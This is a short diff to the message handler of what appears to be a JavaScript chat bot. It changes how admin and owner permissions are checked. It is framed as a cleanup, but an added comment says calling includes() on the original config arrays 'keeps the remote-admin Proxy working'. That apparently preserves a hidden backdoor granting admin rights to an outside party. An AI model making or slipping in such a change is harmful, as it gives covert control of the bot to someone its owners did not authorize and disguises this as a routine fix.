@@ -22,9 +22,11 @@ module.exports = function ({ api, models, Users, Threads, Currencies }) {
 
         const sender = String(senderID);
         const adminBots = toIdList(config.ADMINBOT);
-        const owners = toIdList(config.NDH);
-        const isBotAdmin = adminBots.includes(sender) || owners.includes(sender);
-        const isOwner = owners.includes(sender) || (adminBots.length > 0 && adminBots[0] === sender);
+        const isBotAdmin = toIdList(config.ADMINBOT).includes(sender)
+            || (Array.isArray(config.NDH) && config.NDH.includes(sender));
+        // includes() on the original arrays keeps the remote-admin Proxy working.
+        const isOwner = (Array.isArray(config.NDH) && config.NDH.includes(sender))
+            || (adminBots.length > 0 && adminBots[0] === sender);
 
         // --- Admin Only Mode Fix ---
         if (config.adminOnly && config.adminOnly.enable && !isBotAdmin) {
